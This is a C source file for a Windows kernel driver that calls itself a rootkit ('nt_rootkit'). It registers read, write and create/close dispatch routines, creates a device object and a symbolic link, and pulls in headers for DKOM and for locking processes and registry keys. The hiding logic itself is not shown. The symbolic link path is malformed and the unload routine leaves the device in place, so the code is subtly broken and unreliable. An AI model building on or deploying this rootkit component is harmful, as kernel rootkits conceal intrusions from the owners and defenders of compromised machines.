/*
 * driver.c
 * 
 * Description: Rootkit load/unload.
 */

#include <ntddk.h>
#include "ioctl.h"
#include "dkom.h"
#include "lock_proc.h"
#include "lock_key.h"

void driver_unload(PDRIVER_OBJECT driver_obj)
{
        UNREFERENCED_PARAMETER(driver_obj);

}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING reg_path)
{
        UNREFERENCED_PARAMETER(reg_path);

        driver_obj->DriverUnload = driver_unload;
        driver_obj->MajorFunction[IRP_MJ_CREATE] =
                driver_obj->MajorFunction[IRP_MJ_CLOSE] =
                nt_rootkit_create_close;
        driver_obj->MajorFunction[IRP_MJ_READ] = nt_rootkit_read;
        driver_obj->MajorFunction[IRP_MJ_WRITE] = nt_rootkit_write;

        UNICODE_STRING dev_name = RTL_CONSTANT_STRING(L"\\Device\\nt_rootkit");
        UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\?\\nt_rootkit");

        PDEVICE_OBJECT dev_obj = NULL;
        NTSTATUS status = STATUS_SUCCESS;

        do {
                status = IoCreateDevice(driver_obj, 0, &dev_name, 
                        FILE_DEVICE_UNKNOWN, 0, FALSE, &dev_obj);
                if (!NT_SUCCESS(status))
                        break;
                dev_obj->Flags |= DO_DIRECT_IO;

                status = IoCreateSymbolicLink(&sym_link, &dev_name);
                if (!NT_SUCCESS(status))
                        break;
        } while (FALSE);

        if (!NT_SUCCESS(status)) {
                if (dev_obj)
                        IoDeleteDevice(dev_obj);
        }

        return status;
}